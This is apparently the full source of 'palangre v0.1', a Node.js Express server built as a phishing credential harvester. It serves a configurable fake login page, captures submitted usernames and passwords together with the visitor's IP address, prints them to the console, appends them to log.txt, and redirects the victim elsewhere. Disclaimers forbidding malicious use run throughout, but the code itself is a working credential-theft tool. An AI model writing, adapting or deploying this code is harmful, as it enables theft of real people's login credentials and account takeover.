// Init Chalk
const chalk = require("chalk");

// Init App
console.log(chalk.bold("palangre v0.1 by Ricardo González"));
console.log(chalk.bgRed("The use of palangre for illegal or malicious activities is strictly prohibited. The developer and contributors are not responsible for the misuse of this tool.") + "\n");


// Init Dependencies
console.log(chalk.bold("Loading Dependencies:"));
console.log("Loaded -> Chalk");

const express = require("express");
console.log("Loaded -> Express");

const bodyParser = require("body-parser");
console.log("Loaded -> Body Parser");

const fs = require("fs");
console.log("Loaded -> fs");

console.log("Nodejs plus all of theese dependencies make palangre a thing, thanks to them!" + "\n")


// Init Config
console.log(chalk.bold("Loading Configuration"));
const serve = require("./serve.json");
console.log("Loaded");
console.log("Port -> " + serve.port);
console.log("Content -> " + serve.content);
console.log("Route -> " + serve.route);
console.log("Form Action -> " + serve.action);
console.log("Form Method -> " + serve.method);
console.log("Username Param -> " + serve.username);
console.log("Password Param -> " + serve.password);
console.log("Redirect -> " + serve.redirect + "\n");

// Init Express
const app = express();
const port = serve.port;

app.use(bodyParser.urlencoded({ extended: true }));

// Define log functions
function logRequest(req) {
    // Send Command to CMD
    console.log(chalk.bgYellow("NEW REQUEST"));
    console.log("Route -> " + req.path);
    console.log("IP Address -> " + req.ip + "\n");
}

function logLogin(req) {
    // Send Command to CMD
    console.log(chalk.bgGreen("NEW LOGIN"));
    console.log("IP Address -> " + req.ip);
    console.log("Username -> " + req.body[serve.username]);
    console.log("Password -> " + req.body[serve.password]);

    // Save info into log file
    fs.appendFile("log.txt", "* NEW LOGIN *\nIP Address -> " + req.ip +"\nUsername -> " + req.body[serve.username] + "\nPassword -> " + req.body[serve.password] +"\nDISCLAIMER: The use of palangre for illegal or malicious activities is strictly prohibited. The developer and contributors are not responsible for the misuse of this tool.\n\n", function (err) { if (err) throw err; console.log(chalk.bold("Info saved into log file\n")); console.log(chalk.bgRed("The use of palangre for illegal or malicious activities is strictly prohibited. The developer and contributors are not responsible for the misuse of this tool.\n")); });
}


// When a user does a request to the login page
app.get(serve.route, (req, res) => {
    // Log Request
    logRequest(req);

    // Send content
    res.sendFile(serve.content, {root: __dirname });
})

// When the form is completed and the action gets performed
app.all(serve.action, (req, res) => {
    // Check if method used for the request is the correct one
    if(req.method == serve.method) {
        // If methos used for the request is the correct one

        // Log login
        logLogin(req);

        // Redirect
        res.redirect(serve.redirect);
    } else {
        // If method used for the request isn't the correct one

        // Log Request
        logRequest(req);
        
        // Redirect
        res.redirect(serve.redirect);
    }
})

// When a user does a request to any page
app.use((req, res) => {
    // Log Request
    logRequest(req);
    
    // Redirect
    res.redirect(serve.redirect);
})

// Start Express App
console.log(chalk.bold("Starting Express App"));
app.listen(port, () => {
    // Send info to CMD
    console.log("Started");
    console.log("Express app running on port " + port);
    console.log("\n");

    console.log(chalk.bgRed("The use of palangre for illegal or malicious activities is strictly prohibited. The developer and contributors are not responsible for the misuse of this tool."));
    console.log(chalk.bgGreen("palangre listening on http://localhost:" + serve.port) + "\n")
});